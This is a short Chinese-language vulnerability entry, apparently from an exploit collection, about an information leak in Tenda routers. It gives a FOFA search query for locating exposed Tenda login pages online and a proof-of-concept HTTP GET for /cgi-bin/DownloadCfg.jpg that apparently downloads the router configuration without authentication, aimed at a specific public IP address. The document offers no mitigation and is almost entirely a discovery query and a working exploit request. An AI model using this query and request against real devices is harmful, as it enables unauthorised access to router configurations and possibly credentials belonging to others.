# Tenda 路由器 DownloadCfg 信息泄露漏洞

    ## fofa

```
(title="Tenda | LOGIN" || title="Tenda|登录" || title=="Tenda" || (title="Tenda " && title="Router") || (body="('TENDA '+sys_target+' Router');" && body!="href=\\\"http://www.nexxtsolutions.com/") || server="access to tenda " || body="background:url(tenda-logo-big.png)" || body="/css/tenda.css" || title="TENDA 11N无线路由器登录界面" || (title="Tenda Web Master" && (body="router to restore" || body="router and reset")) || title=="Tenda Wireless Router") && header!="360 web server" && body!="Server: couchdb"
```





## poc

```
GET /cgi-bin/DownloadCfg.jpg HTTP/1.1
Host: 101.255.160.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip


```
